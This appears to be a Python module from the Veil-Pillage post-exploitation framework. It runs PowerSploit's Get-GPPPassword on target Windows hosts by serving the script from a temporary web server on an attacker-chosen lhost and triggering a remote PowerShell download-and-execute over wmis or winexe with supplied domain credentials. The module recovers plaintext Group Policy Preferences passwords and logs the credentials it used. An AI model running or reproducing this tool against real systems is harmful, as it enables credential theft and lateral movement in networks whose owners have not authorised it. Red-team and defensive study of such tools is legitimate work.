"""

Execute PowerSploit's CodeExecution/Get-GPPPassword.ps1 module on our host.

We do this by throwing up a temporary web server, hosting the script and using
invoking the downloader launcher on the host.

NOTE: this only makes sense using a domain account!


All cred to the PowerSploit guys !
    https://github.com/mattifestation/PowerSploit/


Module built by @harmj0y

"""

import time

import settings
from lib import delivery_methods
from lib import helpers
from lib import smb

class Module:
    
    def __init__(self, targets=None, creds=None, args=None):

        self.name = "Get-GPPPassword"
        self.description = ("Execute PowerSploit's Get-GPPPassword module on a host. "
                            "This will Retrieves the plaintext password and other information "
                            "for accounts pushed through Group Policy Preferences.")

        # internal list() that holds one or more targets set by the framework
        self.targets = targets

        # internal list() that holds one or more cred tuples set by the framework
        #   [ (username, pw), (username2, pw2), ...]
        self.creds = creds

        # any relevant text to echo to the output file
        self.output = ""

        #   user interaction for- format is {Option : [Value, Description]]}
        self.required_options = {   "trigger_method"    :   ["wmis", "[wmis] or [winexe] for triggering"],
                                    "use_ssl"           :   ["false", "use https for hosting"],
                                    "lhost"             :   ["", "lhost for hosting"],
                                    "out_file"          :   ["gpp.txt", "temporary output filename used"]}

    def run(self):

        # assume single set of credentials
        username, password = self.creds[0]

        use_ssl = self.required_options["use_ssl"][0]
        lhost = self.required_options["lhost"][0]
        triggerMethod = self.required_options["trigger_method"][0]
        out_file = self.required_options["out_file"][0]

        # the temporary output file gpp-password will write to
        if "\\" not in out_file:
            # otherwise assume it's an absolute path
            out_file = "C:\\Windows\\Temp\\" + out_file 

        # path to the PowerSploit Invoke-Mimikatz.ps1 powershell script
        secondStagePath = settings.VEIL_PILLAGE_PATH+"/data/PowerSploit/Get-GPPPassword.ps1"
        
        # PowerSploit command to run for the file
        scriptArguments = "Get-GPPPassword"

        # trigger the powershell download on all targets
        delivery_methods.powershellHostTrigger(self.targets, username, password, secondStagePath, lhost, scriptArguments, triggerMethod=triggerMethod, outFile=out_file, ssl=use_ssl)

        for target in self.targets:

            self.output += "[*] Powersploit:Get-GPPPassword triggered using creds '"+username+":"+password+"' on "+target+" using "+triggerMethod+"\n"
